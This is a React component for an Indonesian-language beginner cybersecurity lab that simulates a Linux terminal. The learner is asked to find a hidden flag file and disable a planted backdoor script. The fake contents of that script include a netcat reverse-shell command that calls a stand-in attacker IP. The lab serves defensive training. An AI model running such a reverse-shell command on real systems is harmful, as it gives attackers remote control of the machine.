"use client";

import React, { useState, useRef, useEffect } from "react";
import { Card, CardHeader, CardBody, Badge, Button } from "@/components/ui";
import { Terminal as TerminalIcon, CheckCircle2, RotateCcw, Sparkles, HelpCircle } from "lucide-react";
import { useProgress } from "@/lib/progress";

interface Task {
  id: number;
  description: string;
  isDone: boolean;
}

export function LinuxCliLab() {
  const { completeLab } = useProgress();
  const [history, setHistory] = useState<Array<{ type: "cmd" | "out" | "err" | "info"; text: string }>>([
    { type: "info", text: "Selamat datang di Linux Simulated Terminal v1.0." },
    { type: "info", text: "Ketik 'help' untuk melihat daftar perintah yang didukung." },
    { type: "info", text: "Skenario: Anda ditugaskan mengaudit server /home/investigator setelah ada anomali." },
  ]);
  const [inputVal, setInputVal] = useState("");
  const [currentDir, setCurrentDir] = useState("/home/investigator");
  const [filePerms, setFilePerms] = useState<Record<string, string>>({
    "/tmp/backdoor.sh": "-rwxrwxrwx",
  });
  const terminalBottomRef = useRef<HTMLDivElement>(null);

  // Task Tracking
  const [tasks, setTasks] = useState<Task[]>([
    { id: 1, description: "Jalankan 'whoami' dan 'pwd' untuk memeriksa identitas dan direktori kerja Anda.", isDone: false },
    { id: 2, description: "Gunakan 'ls -la' untuk menemukan dan membaca file tersembunyi (.secret_flag.txt).", isDone: false },
    { id: 3, description: "Periksa /tmp dan ubah izin '/tmp/backdoor.sh' menjadi tidak executable (chmod 600 /tmp/backdoor.sh).", isDone: false },
  ]);

  useEffect(() => {
    terminalBottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [history]);

  const allTasksDone = tasks.every((t) => t.isDone);

  const updateTask = (id: number) => {
    setTasks((prev) =>
      prev.map((t) => (t.id === id ? { ...t, isDone: true } : t))
    );
  };

  const handleCommand = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = inputVal.trim();
    if (!cmd) return;

    const newHistory = [...history, { type: "cmd" as const, text: `${currentDir}$ ${cmd}` }];
    const parts = cmd.split(" ");
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);

    switch (command) {
      case "help":
        newHistory.push({
          type: "out",
          text: "Perintah didukung: whoami, pwd, ls, cat, cd, chmod, grep, uname, clear, help",
        });
        break;

      case "whoami":
        newHistory.push({ type: "out", text: "investigator" });
        updateTask(1);
        break;

      case "pwd":
        newHistory.push({ type: "out", text: currentDir });
        updateTask(1);
        break;

      case "uname":
        newHistory.push({ type: "out", text: "Linux cyberlab-node 6.6.0-kali1-amd64 x86_64 GNU/Linux" });
        break;

      case "clear":
        setHistory([]);
        setInputVal("");
        return;

      case "ls":
        const hasAll = args.includes("-a") || args.includes("-la") || args.includes("-al");
        if (currentDir === "/home/investigator") {
          if (hasAll) {
            newHistory.push({
              type: "out",
              text: "drwxr-xr-x 2 investigator investigator 4096 Nov 19 03:00 .\ndrwxr-xr-x 3 root         root         4096 Nov 19 02:00 ..\n-rw-r--r-- 1 investigator investigator  240 Nov 19 03:05 notes.txt\n-rw------- 1 investigator investigator   48 Nov 19 03:10 .secret_flag.txt",
            });
            updateTask(2);
          } else {
            newHistory.push({ type: "out", text: "notes.txt" });
          }
        } else if (currentDir === "/tmp") {
          const perm = filePerms["/tmp/backdoor.sh"] || "-rwxrwxrwx";
          newHistory.push({
            type: "out",
            text: `${perm} 1 root root 82 Nov 19 01:22 backdoor.sh`,
          });
        } else {
          newHistory.push({ type: "out", text: "auth.log  syslog" });
        }
        break;

      case "cat":
        const targetFile = args[0] || "";
        if (targetFile.includes(".secret_flag.txt")) {
          newHistory.push({
            type: "out",
            text: "FLAG{LINUX_CLI_EXPLORER_SUCCESS_2026}\nCatatan: Jangan pernah meninggalkan berkas kredensial di direktori home!",
          });
          updateTask(2);
        } else if (targetFile.includes("notes.txt")) {
          newHistory.push({
            type: "out",
            text: "Laporan Tim Keamanan:\nAda indikasi seseorang mengunggah skrip anomali di folder /tmp bernama backdoor.sh. Segera amankan izin berkasnya!",
          });
        } else if (targetFile.includes("backdoor.sh")) {
          newHistory.push({
            type: "out",
            text: "#!/bin/bash\n# reverse shell simulator\nnc -e /bin/sh 10.10.14.5 4444",
          });
        } else {
          newHistory.push({ type: "err", text: `cat: ${targetFile}: Berkas tidak ditemukan` });
        }
        break;

      case "cd":
        const dest = args[0] || "/home/investigator";
        if (dest === "/tmp" || dest === "tmp") {
          setCurrentDir("/tmp");
          newHistory.push({ type: "out", text: "Berpindah ke /tmp" });
        } else if (dest === "/var/log" || dest === "var/log") {
          setCurrentDir("/var/log");
          newHistory.push({ type: "out", text: "Berpindah ke /var/log" });
        } else if (dest === "~" || dest === "/home/investigator") {
          setCurrentDir("/home/investigator");
          newHistory.push({ type: "out", text: "Berpindah ke /home/investigator" });
        } else if (dest === "..") {
          setCurrentDir("/home");
          newHistory.push({ type: "out", text: "Berpindah ke /home" });
        } else {
          newHistory.push({ type: "err", text: `cd: direktori tidak ditemukan: ${dest}` });
        }
        break;

      case "chmod":
        const mode = args[0];
        const fileTarget = args[1];
        if ((mode === "600" || mode === "400" || mode === "-x") && fileTarget && fileTarget.includes("backdoor.sh")) {
          setFilePerms((prev) => ({ ...prev, "/tmp/backdoor.sh": "-rw-------" }));
          newHistory.push({
            type: "out",
            text: "Mode hak akses /tmp/backdoor.sh berhasil diubah menjadi tidak executable (600).",
          });
          updateTask(3);
        } else {
          newHistory.push({
            type: "out",
            text: `Hak akses diubah dengan parameter: ${args.join(" ")}`,
          });
        }
        break;

      default:
        newHistory.push({
          type: "err",
          text: `bash: ${command}: perintah tidak ditemukan. Ketik 'help' untuk panduan.`,
        });
        break;
    }

    setHistory(newHistory);
    setInputVal("");
  };

  const handleFinishLab = () => {
    completeLab("linux-cli-lab", "Linux Command Line Fundamentals", "terminal-initiate");
  };

  return (
    <Card id="linux-cli-lab" className="border-[var(--color-border)] overflow-hidden">
      <CardHeader className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-[var(--color-accent)] font-bold">LAB 01</span>
            <Badge variant="default" size="sm">Pemula (Beginner)</Badge>
          </div>
          <h2 className="text-lg font-mono font-bold text-[var(--color-text)] mt-1 flex items-center gap-2">
            <TerminalIcon className="w-5 h-5 text-[var(--color-accent)]" />
            Linux Command Line Fundamentals Lab
          </h2>
        </div>
        <Badge variant={allTasksDone ? "success" : "warning"} size="md">
          {allTasksDone ? "Semua Target Selesai" : "Praktikum Berlangsung"}
        </Badge>
      </CardHeader>

      <CardBody className="space-y-6">
        {/* Scenario & Tasks */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="md:col-span-1 p-4 rounded-lg bg-[var(--color-surface-elevated)] border border-[var(--color-border-subtle)] space-y-3 font-mono text-xs">
            <div className="font-bold text-[var(--color-accent)] uppercase flex items-center gap-1.5">
              <Sparkles className="w-4 h-4" />
              <span>Target Praktikum</span>
            </div>
            <div className="space-y-2.5">
              {tasks.map((task) => (
                <div key={task.id} className="flex items-start gap-2">
                  <span className="mt-0.5">
                    {task.isDone ? (
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                    ) : (
                      <div className="w-4 h-4 rounded-full border border-[var(--color-text-muted)] flex items-center justify-center text-[10px] shrink-0">
                        {task.id}
                      </div>
                    )}
                  </span>
                  <span className={task.isDone ? "text-emerald-300 line-through opacity-80" : "text-slate-300"}>
                    {task.description}
                  </span>
                </div>
              ))}
            </div>

            {allTasksDone && (
              <div className="pt-3 border-t border-[var(--color-border-subtle)] space-y-2">
                <p className="text-[11px] text-emerald-400 font-bold">
                  ✓ Selamat! Semua tugas lab Linux berhasil diselesaikan.
                </p>
                <Button size="sm" className="w-full font-mono" onClick={handleFinishLab}>
                  Klaim Badge &amp; Tandai Selesai
                </Button>
              </div>
            )}
          </div>

          {/* Interactive Shell Screen */}
          <div className="md:col-span-2 rounded-lg border border-[var(--color-border)] bg-[#070b12] flex flex-col h-80 overflow-hidden font-mono text-xs shadow-inner">
            <div className="px-3 py-2 border-b border-[var(--color-border-subtle)] bg-[#0d131f] flex items-center justify-between text-[11px] text-[var(--color-text-muted)]">
              <div className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-rose-500/80 inline-block" />
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80 inline-block" />
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80 inline-block" />
                <span className="ml-2">investigator@cyberlab-node:~</span>
              </div>
              <button
                onClick={() => setHistory([{ type: "info", text: "Terminal di-reset." }])}
                className="hover:text-[var(--color-accent)] cursor-pointer"
                title="Bersihkan Terminal"
              >
                <RotateCcw className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Terminal Output */}
            <div className="flex-1 p-3 overflow-y-auto space-y-1.5 leading-relaxed">
              {history.map((h, i) => (
                <div
                  key={i}
                  className={`${
                    h.type === "cmd"
                      ? "text-emerald-300 font-bold"
                      : h.type === "err"
                      ? "text-rose-400"
                      : h.type === "info"
                      ? "text-sky-300 opacity-90"
                      : "text-slate-200"
                  }`}
                >
                  {h.text}
                </div>
              ))}
              <div ref={terminalBottomRef} />
            </div>

            {/* Input Line */}
            <form onSubmit={handleCommand} className="p-2.5 border-t border-[var(--color-border-subtle)] bg-[#090e18] flex items-center gap-2">
              <span className="text-[var(--color-accent)] font-bold">{currentDir}$</span>
              <input
                type="text"
                value={inputVal}
                onChange={(e) => setInputVal(e.target.value)}
                placeholder="Ketik perintah (contoh: ls -la, whoami, help)..."
                className="flex-1 bg-transparent text-[var(--color-text)] focus:outline-none font-mono text-xs"
                autoFocus
              />
            </form>
          </div>
        </div>
      </CardBody>
    </Card>
  );
}
